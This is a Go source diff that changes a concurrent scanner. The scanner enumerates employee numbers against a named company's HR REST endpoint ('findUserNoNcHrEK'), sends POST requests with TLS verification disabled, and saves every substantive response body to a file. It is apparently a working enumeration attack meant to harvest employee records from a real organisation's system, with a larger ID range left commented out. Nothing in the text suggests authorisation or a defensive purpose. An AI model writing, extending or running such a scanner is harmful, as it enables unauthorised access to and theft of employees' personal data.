@@ -7,7 +7,6 @@ import (
 	"io"
 	"net/http"
 	"sync"
-	"time"
 )
 
 // 最大并发数控制
@@ -20,10 +19,26 @@ func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}) {
 	// 控制并发数量
 	sem <- struct{}{}
 	defer func() { <-sem }()
+	// Define the request body (empty JSON data)
+	jsonData := []byte(`{}`)
 
-	// 发起 GET 请求并设置超时
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get(url)
+	// Create a new HTTP request
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
+	if err != nil {
+		fmt.Println("Error creating request:", err)
+	}
+
+	// Set headers
+	req.Header.Set("Host", "it.ofilm.com")
+	req.Header.Set("Content-Type", "application/json")
+
+	// Skip HTTPS certificate verification (insecure)
+	client := &http.Client{
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Printf("[!] 请求失败: %s - %s\n", url, err)
 		return
@@ -34,6 +49,22 @@ func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}) {
 	body, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode == 200 && len(body) > 100 {
 		fmt.Printf("[+] 有效 URL: %s\n", url)
+		saveToFile("valid_urls.txt", url+"\n")
+		saveToFile("response_bodies.txt", fmt.Sprintf("URL: %s\nResponse: %s\n\n", url, string(body)))
+	}
+}
+
+// 将内容追加写入文件
+func saveToFile(filename, data string) {
+	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Println("[!] 文件写入失败:", err)
+		return
+	}
+	defer file.Close()
+
+	if _, err := file.WriteString(data); err != nil {
+		fmt.Println("[!] 写入文件错误:", err)
 	}
 }
 
@@ -42,18 +73,18 @@ func IworkGet() error {
 	sem := make(chan struct{}, maxConcurrency) // 控制最大并发数
 
 	// 扫描范围1: NF0000 - NF4000
-	for i := 0; i <= 4000; i++ {
+	for i := 3260; i <= 3270; i++ {
 		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/NF%04d", i)
 		wg.Add(1)
 		go fetchURL(&wg, url, sem)
 	}
 
-	// 扫描范围2: N00000 - N99999
-	for i := 0; i <= 99999; i++ {
-		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
-		wg.Add(1)
-		go fetchURL(&wg, url, sem)
-	}
+	// // 扫描范围2: N00000 - N99999
+	// for i := 0; i <= 99999; i++ {
+	// 	url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
+	// 	wg.Add(1)
+	// 	go fetchURL(&wg, url, sem)
+	// }
 
 	wg.Wait() // 等待所有 goroutine 完成
 	fmt.Println("[*] 扫描完成")
